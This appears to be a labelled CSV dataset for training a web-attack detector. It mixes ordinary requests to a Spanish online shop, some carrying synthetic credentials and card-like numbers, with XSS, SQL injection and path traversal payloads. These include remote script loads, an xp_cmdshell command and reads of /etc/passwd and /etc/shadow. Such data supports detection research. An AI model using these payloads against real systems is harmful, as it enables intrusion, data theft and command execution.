miembros/imagenes/castro.jpg,normal,0.255251622
global/creditos.jsp,normal,0.936717486
<script ~~~>alert(0%0)</script ~~~>,xss,0.181952614
"<BASE HREF=""javascript:alert('XSS');//"">",xss,0.615966039
\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal,0.148103604
"<xml src=""javascript:document.vulnerable=true;"">",xss,0.138916533
"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",xss,0.775983476
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=90&B1=A%F1adir+al+carrito,normal,0.866031902
miembros/editar.jsp?modo=registro&login=joyan&password=hojaldrista&nombre=Mathius&apellidos=Narvate&email=pupinyo%40multaspendientes.ve&dni=08466616V&direccion=Aaiun%2C+122+12%3FF&ciudad=Andosilla&cp=17800&provincia=Le%F3n&ntc=8860654392526309&B1=Registrar,normal,0.567260313
"<IMG SRC=x onafterprint=""alert(String.fromCharCode(88,83,83))"">",xss,0.495925815
miembros/salir.jsp,normal,0.808844773
so..&: select * from users where id='1'<@.. or 1=1 -- 1',sqli,0.792654909
"<a href=""\xE3\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.688965266
publico/miembros.jsp,normal,0.317712582
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss,0.210680953
imagenes/2.gif,normal,0.681863909
publico/pagar.jsp?modo=insertar&precio=4427&B1=Confirmar,normal,0.031576373
global/titulo.jsp,normal,0.183129786
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=35&B1=A%F1adir+al+carrito,normal,0.123073611
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal,0.82701093
"sUEnv: select * from users where id='1' union select $*$,@@VERSION -- 1'",sqli,0.307091348
"<IMG SRC=x onplay=""alert(String.fromCharCode(88,83,83))"">",xss,0.319252281
publico/carrito.jsp,normal,0.114634041
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss,0.673189276
"<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss,0.821068034
imagenes/1.gif,normal,0.259699942
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,xss,0.000746329
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,sqli,0.007961878
"<img src\x09=x onerror=""javascript:alert(1)"">",xss,0.811659776
miembros/index.jsp,normal,0.247740873
"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.176133479
..%5c..%5c..%5c{FILE},traversal,0.428181198
imagenes/logo.gif,normal,0.775542943
"&lt;IMG LOWSRC=\""javascript&#058;alert('XSS')\""&gt;",xss,0.5858989
imagenes/1.gif,normal,0.808487756
"<;TABLE>;<;TD BACKGROUND="";javascript:alert(';XSS';)"";>;<;/TD>;<;/TABLE>;",xss,0.201449918
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=86&B1=A%F1adir+al+carrito,normal,0.974089451
<script ~~~>alert(0%0)</script ~~~>,xss,0.290557441
imagenes/logo.gif,normal,0.469293154
global/creditos.jsp,normal,0.950767677
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss,0.364407824
global/creditos.jsp,normal,0.496036765
global/creditos.jsp,normal,0.842058552
publico/productos.jsp,normal,0.470854978
publico/carrito.jsp,normal,0.213255855
imagenes/nuestratierra.jpg,normal,0.706273911
&#x003c;,xss,0.379964803
miembros/index.jsp,normal,0.43139318
miembros/fotos.jsp,normal,0.882097115
publico/caracteristicas.jsp?id=1,normal,0.212714546
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=79&B1=A%F1adir+al+carrito,normal,0.774734411
miembros/imagenes/zarauz.jpg,normal,0.83060614
miembros/index.jsp,normal,0.653188104
admin') or '1'='1,sqli,0.334884126
miembros/imagenes/castro.jpg,normal,0.913878085
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.960198825
.\\..\\.\\..\\{FILE},traversal,0.978180988
publico/pagar.jsp?modo=insertar&precio=7361&B1=Confirmar,normal,0.111805547
publico/pagar.jsp?modo=insertar&precio=6258&B1=Pasar+por+caja,normal,0.669772809
"ABC<div style=""x:\xEF\xBB\xBFexpression(javascript:alert(1)"">DEF",xss,0.264348618
"&()o1: select * from users where id=1 or (\)=1 union select 1,@@VERSION -- 1",sqli,0.795509074
publico/miembros.jsp,normal,0.625613369
publico/miembros.jsp,normal,0.671111389
imagenes/cmenbul.gif,normal,0.262837446
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},traversal,0.008568871
imagenes/nuestratierra.jpg,normal,0.972926685
publico/carrito.jsp,normal,0.906046422
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >,xss,0.110188375
"<;OBJECT TYPE="";text/x-scriptlet""; DATA="";http://ha.ckers.org/scriptlet.html"";>;<;/OBJECT>;",xss,0.5049124
imagenes/cmenbul.gif,normal,0.254896024
miembros/fotos.jsp,normal,0.742742802
publico/productos.jsp,normal,0.242940609
miembros/fotos.jsp,normal,0.958126225
index.jsp,normal,0.708405037
miembros/editar.jsp?modo=registro&login=baggerma&password=0e8v88E&nombre=Dionio&apellidos=Arceo+Feliu&email=goldman%40casabolsa43.rw&dni=06966107M&direccion=Calle+Santa+Escolastica%2C+184+&ciudad=Sollana&cp=17534&provincia=Murcia&ntc=7840792716096931&B1=Registrar,normal,0.220424501
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE},traversal,0.843553852
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>,xss,0.738405744
"<a href=""\x1Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.645289192
"<XSS STYLE=""xss:expression(javascript:alert(1))"">",xss,0.870321848
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=83&B1=A%F1adir+al+carrito,normal,0.133876847
"<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(123)</script></svg>",xss,0.284935617
miembros/fotos.jsp,normal,0.361236643
<script\x2F>javascript:alert(1)</script>,xss,0.173430536
"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.578275203
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.203572634
..\{FILE},traversal,0.404166743
admin' or '1'='1'#,sqli,0.949721009
publico/pagar.jsp?modo=insertar&precio=5855&B1=Confirmar,normal,0.303305334
"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>",xss,0.219138591
global/estilos.css,normal,0.770256588
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE},traversal,0.055849023
publico/caracteristicas.jsp?id=1,normal,0.317674962
"<head><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-",xss,0.946534045
global/menum.jsp,normal,0.510866854
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>",xss,0.137934403
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;,xss,0.62246729
global/titulo.jsp,normal,0.811091337
global/creditos.jsp,normal,0.028044542
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,sqli,0.275380375
"<img src\x13=x onerror=""javascript:alert(1)"">",xss,0.59598458
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../{FILE},traversal,0.097823355
miembros/fotos.jsp,normal,0.205850025
imagenes/1.gif,normal,0.035264088
"<;A HREF="";http://google.com/"";>;XSS<;/A>;",xss,0.625462114
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss,0.519941982
miembros/index.jsp,normal,0.371971786
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;,xss,0.087272111
"<BGSOUND SRC=""javascript:javascript:alert(1);"">",xss,0.688714949
imagenes/3.gif,normal,0.559249919
miembros/imagenes/zarauz.jpg,normal,0.1967144
[color=red width=expression(alert(123))][color],xss,0.839269698
"<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.621053349
publico/registro.jsp?modo=registro&login=penningt&password=BRUscatE&nombre=Teresilda&apellidos=Claverol+Lemunao&email=cadenat.mulich%404ghz.do&dni=69634281X&direccion=Alonso+De+Mendoza%2C+31+3B&ciudad=Villares+de+Soria%2C+Los&cp=44310&provincia=Girona&ntc=1657191621298298&B1=Registrar,normal,0.730249826
publico/pagar.jsp?modo=insertar&precio=2306&B1=Pasar+por+caja,normal,0.172799479
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",sqli,0.455228329
"<img src=""livescript:document.vulnerable=true;"">",xss,0.008978983
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss,0.146452734
imagenes/cmenbul.gif,normal,0.857698406
"<a href=""\x14javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.315343817
miembros/imagenes/ogono.jpg,normal,0.752650965
imagenes/1.gif,normal,0.727082258
global/menum.jsp,normal,0.911983156
miembros/salir.jsp,normal,0.032197711
"s&o.U: select * from users where id='1' or \<\. union select 1,@@VERSION -- 1'",sqli,0.260936652
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss,0.243875594
publico/productos.jsp,normal,0.676572894
".UEv,: select * from users where id=1. union select null,version() -- 1",sqli,0.99669586
global/menum.jsp,normal,0.235999114
\../\../\../\../\../\../{FILE},traversal,0.844070076
index.jsp,normal,0.507110309
imagenes/2.gif,normal,0.887654898
miembros/fotos.jsp,normal,0.320300459
global/creditos.jsp,normal,0.73633975
"<x style=""behavior:url(%(sct)s)"">",xss,0.099013795
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,xss,0.9998152
"""`'><script>\xE2\x80\x82javascript:alert(1)</script>",xss,0.841710151
publico/autenticar.jsp?modo=entrar&login=doretta5&pwd=InoFENSiVA&remember=off&B1=Entrar,normal,0.964249164
..........................................................................\..\..\..\{FILE},traversal,0.958265034
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",sqli,0.649246944
index.jsp,normal,0.146390066
"<BGSOUND SRC=""javascript:alert('XSS');"">",xss,0.894530522
"<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",xss,0.646765466
%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE},traversal,0.432100079
global/titulo.jsp,normal,0.992954797
miembros/imagenes/ogono.jpg,normal,0.730277735
"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",xss,0.722601026
"<STYLE>li {list-style-image: url(""javascript:javascript:alert(1)"");}</STYLE><UL><LI>XSS",xss,0.479047027
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=40&B1=A%F1adir+al+carrito,normal,0.1555783
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",xss,0.646368335
&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;,xss,0.637725289
publico/autenticar.jsp?modo=entrar&login=leonard&pwd=escasamente&remember=off&B1=Entrar,normal,0.8891436
</html>,xss,0.940298524
imagenes/nuestratierra.jpg,normal,0.157896104
%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE},traversal,0.144594747
"<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.187936509
global/creditos.jsp,normal,0.117287123
<iframe// src=javaSCRIPT&colon;alert(1),xss,0.860555181
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss,0.232965286
"""`'><script>\xE2\x80\x81javascript:alert(1)</script>",xss,0.070706833
publico/caracteristicas.jsp?id=1,normal,0.673777089
"ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",xss,0.506396724
publico/registro.jsp?modo=registro&login=eward&password=%24despumar&nombre=Rory&apellidos=Naredo+Reggiardo&email=korey_molina%40juguetespersonales.gob&dni=37068097D&direccion=Calle+Fausto+Fraile+0+&ciudad=Aracena&cp=17256&provincia=Palencia&ntc=3362439041972349&B1=Registrar,normal,0.886115021
imagenes/nuestratierra.jpg,normal,0.870243071
o1&1c: select * from users where id=1 *1 or 1=1 -- 1,sqli,0.071126393
%2e%2e%5c%2e%2e%5c{FILE},traversal,0.756261114
miembros/editar.jsp?modo=registro&login=raab&password=ac6%EDdi9o&nombre=Thal%EDa&apellidos=Albornoz+Quiva&email=heldabrand5%40chevrolet-volt.bg&dni=11738063J&direccion=C%2F+Otumba%2C+132%2C+&ciudad=Carataunas&cp=43791&provincia=Cuenca&ntc=8400067402160298&B1=Registrar,normal,0.918329631
"&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;XSS&lt;/A&gt;",xss,0.608871944
"<img STYLE=""xss:expr/*XSS*/ession(document.vulnerable=true)"">",xss,0.766817495
%2e%2e\%2e%2e\{FILE},traversal,0.236383815
global/creditos.jsp,normal,0.1983783
http://www.google<script .com>alert(document.location)</script,xss,0.36619319
<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>,xss,0.887442364
..\..\..\..\..\..\{FILE},traversal,0.438188689
imagenes/1.gif,normal,0.776543744
publico/autenticar.jsp?modo=entrar&login=sait&pwd=t20s3da43%F36&remember=on&B1=Entrar,normal,0.570314091
"<% foo><x foo=""%><script>alert(123)</script>"">",xss,0.751318246
/../../../../../../../../../../etc/passwd^^,traversal,0.914360327
global/menum.jsp,normal,0.78451081
"<XSS STYLE=""xss:expression(javascript:alert(1))"">",xss,0.312905262
&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;,xss,0.855632952
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,traversal,0.158354154
'); alert('xss'); var x=',xss,0.075998039
"<IMG LOWSRC=""javascript:javascript:alert(1)"">",xss,0.700323059
<img/src=`%00` onerror=this.onerror=confirm(1) ,xss,0.129520059
publico/caracteristicas.jsp?id=2,normal,0.82262062
"<! foo=""><script>alert(1)</script>"">",xss,0.520679751
"&lt;SCRIPT/SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss,0.622834757
...\...\...\...\...\{FILE},traversal,0.971420173
../../../../../../../../../../../../etc/passwd%00,traversal,0.011336711
imagenes/cmenbul.gif,normal,0.973788681
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.128059002
imagenes/cmenbul.gif,normal,0.624359764
"&lt;TABLE BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",xss,0.834619446
global/menum.jsp,normal,0.919832171
publico/caracteristicas.jsp?id=1,normal,0.153661981
miembros/imagenes/zarauz.jpg,normal,0.477804583
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=14&B1=A%F1adir+al+carrito,normal,0.905557957
miembros/salir.jsp,normal,0.811734559
"s1c: select * from users where id=1 or ""1#"" or 1=1 -- 1",sqli,0.92290777
index.jsp,normal,0.42677389
publico/caracteristicas.jsp?id=2,normal,0.656502561
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.112872613
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss,0.899843517
miembros/imagenes/zarauz.jpg,normal,0.762941969
"so.s: select * from users where id=1 or ""%."" or 1=1 -- 1",sqli,0.313944683
imagenes/1.gif,normal,0.734245903
<img src=`xx:xx`onerror=alert(1)>,xss,0.91395538
miembros/imagenes/castro.jpg,normal,0.152470379
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss,0.910504853
"<img src=""javascript:alert('XSS');"">",xss,0.60640054
global/creditos.jsp,normal,0.522953749
miembros/imagenes/zarauz.jpg,normal,0.262447988
"sUE,v: select * from users where id='1' union select \,@@VERSION -- 1'",sqli,0.768983691
"s?UEf: select * from users where id=1 or 1#""? union select version(),version() -- 1",sqli,0.225088286
publico/pagar.jsp?modo=insertar&precio=5668&B1=Confirmar,normal,0.161485664
x' or 1=1 or 'x'='y,sqli,0.169441584
miembros/fotos.jsp,normal,0.388007439
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,traversal,0.905958363
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",xss,0.254148473
publico/pagar.jsp?modo=insertar&precio=1976&B1=Confirmar,normal,0.856517517
"s,UEv: select * from users where id=1 or 1#"", union select null,version() -- 1",sqli,0.064807685
../../../../../../../../../etc/passwd,traversal,0.555661963
miembros/salir.jsp,normal,0.502005979
"`""'><img src=xxx:x \x22onerror=javascript:alert(1)>",xss,0.421164703
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss,0.918190064
publico/carrito.jsp,normal,0.361169162
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,xss,0.427464162
global/menum.jsp,normal,0.705338628
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",xss,0.583379985
global/estilos.css,normal,0.605380178
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss,0.89144198
<iframe/onreadystatechange=alert(1),xss,0.317300716
),sqli,0.01924283
miembros/imagenes/castro.jpg,normal,0.361543834
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss,0.348040461
miembros/imagenes/zarauz.jpg,normal,0.088151762
"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",xss,0.73462139
"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",xss,0.672328558
publico/miembros.jsp,normal,0.770575052
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,sqli,0.793639521
miembros/imagenes/zarauz.jpg,normal,0.70985341
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,xss,0.984009451
index.jsp,normal,0.293363059
miembros/salir.jsp,normal,0.268094573
miembros/imagenes/zarauz.jpg,normal,0.986451398
"<bgsound src=""javascript:document.vulnerable=true;"">",xss,0.372881919
"<base HREF=""javascript:document.vulnerable=true;//"">",xss,0.059274188
imagenes/nuestratierra.jpg,normal,0.157578335
miembros/fotos.jsp,normal,0.574146392
publico/registro.jsp?modo=registro&login=francois&password=patay&nombre=Gina&apellidos=Rofes&email=brando%40elsentidodelavida.lc&dni=61877469V&direccion=Hoyo+Higueron+32+3-F&ciudad=Herrer%EDa&cp=08880&provincia=Sevilla&ntc=6691710338743371&B1=Registrar,normal,0.553714409
index.jsp,normal,0.002470598
"<BASE HREF=""javascript:alert('XSS');//"">",xss,0.346609773
<script>a=/XSS/\ndocument.vulnerable=true;</script>,xss,0.195110756
imagenes/cmenbul.gif,normal,0.3493116
password:*/=1--,sqli,0.604454709
<iframe/%00/ src=javaSCRIPT&colon;alert(1),xss,0.663228254
"<img src\x11=x onerror=""javascript:alert(1)"">",xss,0.311591458
"<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.485608383
"""><h1><iframe width=""420"" height=""315"" src=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" allowfullscreen></iframe>123</h1>",xss,0.546685082
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",xss,0.180259848
imagenes/cmenbul.gif,normal,0.211813757
miembros/fotos.jsp,normal,0.828362564
../..//../..//{FILE},traversal,0.524233437
"<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.182315901
&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;,xss,0.479664175
x' or full_name like '%bob%,sqli,0.225549155
asc,sqli,0.530158274
"&nooU: select * from users where id=1 or $+<\ union select 1,@@VERSION -- 1",sqli,0.62551758
miembros/fotos.jsp,normal,0.06039244
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>,xss,0.945047439
global/titulo.jsp,normal,0.824433179
miembros/imagenes/castro.jpg,normal,0.244215302
"admin"") or (""1""=""1""--",sqli,0.447929637
global/creditos.jsp,normal,0.801737125
miembros/editar.jsp?modo=registro&login=pericak&password=e11c5nt6o&nombre=Icahel&apellidos=Berm%FAdez+Delvalle&email=comber%40barnicesultravioleta.kz&dni=17103014F&direccion=Hierros+161+10F&ciudad=Carcaboso&cp=19371&provincia=Sevilla&ntc=7332706873817194&B1=Registrar,normal,0.570902
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),xss,0.735304709
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE},traversal,0.987284613
publico/registro.jsp?modo=registro&login=wittik&password=%21p3RAdeR9&nombre=Alma&apellidos=Blotta+Azagra&email=kashfi%40cropbay.jobs&dni=01237478D&direccion=Abubilla%2C+125+12H&ciudad=Arrazua-Ubarrundia&cp=10620&provincia=%C1vila&ntc=6204145249044457&B1=Registrar,normal,0.930447721
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},traversal,0.743060402
%25c0%25ae%25c0%25ae%25c1%259c{FILE},traversal,0.231029275
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",xss,0.153853779
imagenes/3.gif,normal,0.101857715
publico/miembros.jsp,normal,0.869661482
publico/pagar.jsp?modo=insertar&precio=1596&B1=Confirmar,normal,0.832058869
%2e%2e%2f%2e%2e%2f{FILE},traversal,0.939905808
miembros/salir.jsp,normal,0.573044323
publico/miembros.jsp,normal,0.064074578
"1UEvk: select * from users where id=1 +1 union select null,banner from v$version where rownum=1 -- 1",sqli,0.906213423
' or 3=3,sqli,0.774854047
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.291146475
<SCRIPT SRC=//ha.ckers.org/.j>,xss,0.06060036
miembros/index.jsp,normal,0.789861866
"<div style=""binding: url([link to code]);"">",xss,0.381175506
' or (EXISTS),sqli,0.863926997
publico/productos.jsp,normal,0.514026138
miembros/imagenes/castro.jpg,normal,0.598249093
"`""'><img src=xxx:x \x20onerror=javascript:alert(1)>",xss,0.918797785
<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;,xss,0.011683233
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,0.018533316
publico/carrito.jsp,normal,0.799433213
miembros/salir.jsp,normal,0.30501752
miembros/imagenes/castro.jpg,normal,0.635813517
global/estilos.css,normal,0.564695956
"<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>",xss,0.128793884
"<img src\x47=x onerror=""javascript:alert(1)"">",xss,0.442592554
global/estilos.css,normal,0.124097131
publico/caracteristicas.jsp?id=1,normal,0.411751652
miembros/index.jsp,normal,0.584899035
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=10&B1=A%F1adir+al+carrito,normal,0.427383176
<form><button formaction=javascript&colon;alert(1)>CLICKME,xss,0.428401891
"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",xss,0.698170574
global/titulo.jsp,normal,0.279175298
imagenes/logo.gif,normal,0.408771919
"<BASE HREF=""javascript:javascript:alert(1);//"">",xss,0.119586092
publico/autenticar.jsp?modo=entrar&login=nhat&pwd=t2591151&remember=off&B1=Entrar,normal,0.512743621
"soo1U: select * from users where id='1' <@&1 union select 1,version() -- 1'",sqli,0.484845115
imagenes/logo.gif,normal,0.501779491
&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;,xss,0.528888495
..%255c..%255c{FILE},traversal,0.352234528
miembros/editar.jsp?modo=registro&login=maggee&password=m1n*6848&nombre=Mar%EDa+Bel%E9n&apellidos=Jorge+Paquirachi&email=bartlett%40waterflyesp.eh&dni=82474321R&direccion=Calle+Silvestre+Peromarta+60%2C+&ciudad=Santa+Mar%EDa+de+las+Hoyas&cp=26213&provincia=Girona&ntc=6708008477094577&B1=Registrar,normal,0.522053186
<img src=`xx:xx`onerror=alert(1)>,xss,0.132832464
miembros/fotos.jsp,normal,0.227823977
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=49&B1=A%F1adir+al+carrito,normal,0.387573652
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=98&B1=A%F1adir+al+carrito,normal,0.056571626
global/creditos.jsp,normal,0.891772276
miembros/imagenes/zarauz.jpg,normal,0.849248718
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.701755801
') or ('x')=('x,sqli,0.49995667
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.080960043
publico/productos.jsp,normal,0.432940142
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss,0.348207638
"<a href=""javascript\x00:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.40087078
........................................................................../../../../{FILE},traversal,0.972541619
<iframe src=http://xss.rocks/scriptlet.html <,xss,0.386973147
imagenes/3.gif,normal,0.147084564
